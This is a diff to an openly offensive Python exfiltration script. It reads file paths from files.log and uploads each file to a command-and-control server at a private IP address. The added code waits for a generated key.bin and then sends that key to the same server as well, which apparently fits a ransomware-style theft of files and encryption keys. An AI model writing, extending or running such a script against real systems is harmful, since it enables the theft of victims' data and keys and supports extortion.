@@ -1,5 +1,6 @@
 import os
 import requests
+import time
 
 def exfiltrate_file(file_path, url):
     try:
@@ -20,7 +21,18 @@ def exfiltrate_file(file_path, url):
     except Exception as e:
         print(f"[!] Error sending {file_path}: {e}")
 
-def run_exfiltration(log_file="files.log", c2_url="http://172.20.10.3:8080"):
+def wait_for_key(key_path, timeout=60):
+    print("[*] Waiting for key.bin to be generated...")
+    elapsed = 0
+    while not os.path.exists(key_path):
+        time.sleep(1)
+        elapsed += 1
+        if elapsed >= timeout:
+            print("[!] Timed out waiting for key.bin.")
+            return False
+    return True
+
+def run_exfiltration(log_file="files.log", c2_url="http://192.168.1.18:8080"):
     if not os.path.exists(log_file):
         print("[-] files.log not found.")
         return
@@ -34,6 +46,11 @@ def run_exfiltration(log_file="files.log", c2_url="http://172.20.10.3:8080"):
             exfiltrate_file(filepath, c2_url)
         else:
             print(f"[-] Skipped missing file: {filepath}")
+
+    # Wait and send key.bin
+    key_path = "key.bin"
+    if wait_for_key(key_path):
+        exfiltrate_file(key_path, c2_url)
 
 if __name__ == "__main__":
     run_exfiltration()
